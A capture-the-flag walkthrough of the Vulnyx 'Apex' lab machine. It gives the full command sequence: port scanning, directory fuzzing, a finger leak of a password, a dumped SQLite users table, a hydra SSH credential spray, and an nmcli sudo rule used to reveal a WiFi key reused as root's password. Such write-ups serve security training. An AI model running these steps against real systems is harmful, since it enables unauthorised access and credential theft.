# Vulnyx: Apex

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `finger` · `sqlite3` · `hydra` |
| **Tags** | `#InfoDisclosure` `#DatabaseLeak` `#CredentialStuffing` `#SudoAbuse` `#CredentialReuse` |
| **URL** | https://vulnyx.com/machines/ |

A backup directory left on the web server holds a SQLite database with a full `users` table — usernames and passwords alike — turned directly into a targeted credential list for SSH. From there, a `sudo` rule around `nmcli` is enough to reveal a saved WiFi network's PSK, which turns out to be reused as root's own password.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn apex.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
79/tcp open  finger  syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:91:09:91 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **79 (finger)**, and **80 (HTTP)**. A version and script scan on all three fills in the details:

```bash
$ sudo nmap -p 22,79,80 -sCV apex.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: The all seeing eye...
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:91:09:91 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://apex.nyx/
```

<img src="../Images/apex/Pasted image 20260805172622.png"/>

> **God's name:** `horus`

```bash
$ ffuf -u http://apex.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html             [Status: 200, Size: 878, Words: 303, Lines: 37, Duration: 4ms]
.html                  [Status: 403, Size: 273, Words: 10, Lines: 10, Duration: 11ms]
backup                 [Status: 401, Size: 455, Words: 15, Lines: 6, Duration: 6ms]
.html                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 8ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 8ms]
```

`/backup` comes back `401` rather than `403` or a listing — it exists, but sits behind HTTP Basic Auth.

### Finger Enumeration

The theming on the main page (`horus`) hints at a name worth testing directly against `finger`:

```bash
$ finger root@apex.nyx
Login: root                            Name: root
Directory: /root                       Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

```bash
$ finger horus@apex.nyx
Login: horus                           Name:
Directory: /home/horus                 Shell: /bin/bash
Never logged in.
Mail forwarded to horus@point.nyx
No mail.
PGP key:
personal notes: H0Ru$$3rv3
No Plan.
```

`finger` isn't authenticated and isn't meant to expose secrets, but "personal notes" is a free-text field — and `H0Ru$$3rv3` reads far more like a credential than an actual note.

## Initial Access

### Loot: A Backup SQLite Database

`horus` (the site's theme) and `H0Ru$$3rv3` (the finger note) line up neatly as a Basic Auth username/password pair for `/backup` — and they clear the prompt:

```
http://apex.nyx/backup
```

<img src="../Images/apex/Pasted image 20260805172729.png"/>
<img src="../Images/apex/Pasted image 20260805172741.png"/>

Past the prompt, `database.db` sits in the directory listing; `wget` pulls it down and `sqlite3` opens it:

```bash
$ wget --user horus --password 'H0Ru$$3rv3' http://apex.nyx/backup/database.db
$ sqlite3 database.db
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
sqlite>
```

### Building Credential Lists

The query result goes straight to a file — sqlite3's default output already uses `|` as the column separator, exactly what `cut` expects next — and `cut` splits the `username` and `password` columns into two independent lists rather than matched pairs, on the chance any user reused someone else's password:

```bash
$ sqlite3 database.db "SELECT * FROM users;" > users_db
$ cut -d '|' -f 2 users_db | tee users.txt
$ cut -d '|' -f 3 users_db | tee passwords.txt
```

```bash
$ hydra -L users.txt -P passwords.txt ssh://apex.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://apex.nyx:22/
[22][ssh] host: apex.nyx   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
1 of 1 target successfully completed, 1 valid password found
```

That cross-matching is exactly what pays off: the working login pairs `seth`'s username with `amon`'s password (row 2 above), not the password listed against `seth`'s own row — a per-row credential list would have missed it entirely.

### Shell as seth

```bash
$ ssh seth@apex.nyx
seth@apex.nyx's password:
seth@apex:~$ id
uid=1001(seth) gid=1001(seth) groups=1001(seth)
seth@apex:~$ ls -l /home/seth/
total 4
-r--------    1 seth     seth            33 Jan 21  2025 user.txt
seth@apex:~$ cat /home/seth/user.txt
cb991ca285fc33a6d0ea1cab5f65d3ce
```

> **User flag:** `cb991ca285fc33a6d0ea1cab5f65d3ce`

## Privilege Escalation

### Revealing a WiFi PSK via `sudo nmcli`

```bash
seth@apex:~$ sudo -l
-bash: sudo: command not found
```

```bash
seth@apex:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x    1 root     root         55528 Mar 28  2024 /usr/bin/mount
-rwsr-xr-x    1 root     root         71912 Mar 28  2024 /usr/bin/su
-rwsr-xr-x    1 root     root         58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x    1 root     root         88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x    1 root     root         52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x    1 root     root         35040 Mar 28  2024 /usr/bin/umount
-rwsr-xr-x    1 root     root         63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x    1 root     root         44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr---   1 root     dip         403752 Jan 21  2025 /usr/sbin/pppd
-rwsr-xr-x    1 root     root        182600 Jan 21  2025 /usr/sbin/sudo
-rwsr-xr-x    1 root     root        481608 Dec 21  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr---   1 root     messagebus   51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x    1 root     root         19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
seth@apex:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
seth@apex:~$ /usr/sbin/sudo -l
Matching Defaults entries for seth on apex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seth may run the following commands on apex:
    (root) NOPASSWD: /usr/bin/nmcli
```

`sudo` isn't in `seth`'s `$PATH`, which is why the first call failed — but the SUID search shows the binary lives at `/usr/sbin/sudo`, and invoking it by absolute path works regardless. `nmcli` — NetworkManager's command-line tool — can be run as root. Saved network profiles can hold a PSK marked as a protected secret, normally hidden from a plain `connection show`; but `nmcli`'s own `-s` (show secrets) and `-g` (get a specific field) options reveal it directly, and running as root via `sudo` bypasses whatever permission would otherwise restrict that:

```bash
seth@apex:~$ /usr/sbin/sudo -u root nmcli connection show
NAME             UUID                                   TYPE      DEVICE
MikroTik_AP      e25d230b-bb26-4488-b2e0-1b94dac2b9cd    wifi      --
seth@apex:~$ find / -name MikroTik_AP 2>/dev/null
/etc/NetworkManager/system-connections/MikroTik_AP
seth@apex:~$ ls -l /etc/NetworkManager/system-connections/MikroTik_AP
-rw-------    1 root     root           227 Jan 21  2025 /etc/NetworkManager/system-connections/MikroTik_AP
seth@apex:~$ /usr/sbin/sudo -u root nmcli -s -g 802-11-wireless-security.psk connection show "MikroTik_AP"
WIFI_pa$$w0rd_is_$up3r_$3cur3
```

> **Credentials:** `root:WIFI_pa$$w0rd_is_$up3r_$3cur3`

The WiFi network's own password turns out to be reused as root's system password:

```bash
seth@apex:~$ su root
Password:
root@apex:/home/seth# id
uid=0(root) gid=0(root) groups=0(root)
root@apex:/home/seth# ls -l /root/
total 4
-r--------    1 root     root            33 Jan 21  2025 root.txt
root@apex:/home/seth# cat /root/root.txt
c03c45d855d3b683b1637d3b93ead481
```

> **Root flag:** `c03c45d855d3b683b1637d3b93ead481`

## Takeaways

- A backup file or directory reachable over HTTP is a common way for a full data export — database included — to leak entirely by accident; it's worth checking for directly rather than assuming credentials are only exposed through the application itself.
- `finger`, though rarely seen today, is still worth checking against names hinted at elsewhere on a target — a themed website, a company name, or any other in-context clue is a reasonable seed for testing valid usernames. Its free-text fields are worth reading closely, too: a "personal notes" entry has no business holding a password, which is exactly why it's an easy place to miss one.
- When a leaked dump has multiple users, spraying every username against every recovered password — not just each row's own pair — can catch reuse between accounts, as it does here.
- `sudo` rules around network-management tools like `nmcli` are risky beyond just "running commands as root" — their own secret-revealing features (meant for legitimate administrative use) become an information disclosure vector the moment they run with elevated privileges.